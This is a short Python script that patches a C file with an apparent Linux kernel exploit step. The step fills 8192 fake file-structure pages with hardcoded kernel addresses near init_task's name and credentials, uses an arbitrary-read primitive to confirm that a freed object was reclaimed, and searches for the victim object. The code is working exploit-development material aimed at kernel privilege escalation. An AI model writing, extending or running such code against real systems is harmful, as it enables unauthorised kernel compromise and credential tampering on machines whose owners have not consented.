import re

with open("tier2/scripts/test_hyp012_swaps.c", "r") as f:
    code = f.read()

new_search = """    // Initialize ALL pages with a safe f_inode (init_task.comm)
    for (int i=0; i<8192; i++) {
        *(uint64_t*)(fake_files[i] + 32) = 0xffffffc00973e258 - 0x40; // init_task.comm
    }
    
    // Verify reclaim actually worked
    uint64_t initial_val = aar_read(epA, fake_files[0], 0xffffffc00973e258);
    if (initial_val != 0x2f72657070617773) {
        printf("[-] Reclaim failed or oracle broken! Read %lx\\n", initial_val);
        return 1;
    }
    
    int victim_idx = -1;
    // Find victim by changing f_inode one by one to a DIFFERENT safe address (init_task.tasks = 0xffffffc00973e258 - 0x2c8)
    // Actually just use init_task.cred (0xffffffc00973dac0 + 0x788 = 0xffffffc00973e248)
    for (int i=0; i<8192; i++) {
        *(uint64_t*)(fake_files[i] + 32) = 0xffffffc00973e248 - 0x40;
        uint64_t val = aar_read(epA, fake_files[i], 0xffffffc00973e248);
        if (val != 0x2f72657070617773) { // It changed!
            victim_idx = i;
            break;
        }
        // Restore
        *(uint64_t*)(fake_files[i] + 32) = 0xffffffc00973e258 - 0x40;
    }
"""

code = re.sub(r"    int victim_idx = -1;\n    for \(int i=0; i<8192; i\+\+\) \{.*?\n        \}\n    \}", new_search, code, flags=re.DOTALL)

with open("tier2/scripts/test_hyp012_swaps.c", "w") as f:
    f.write(code)
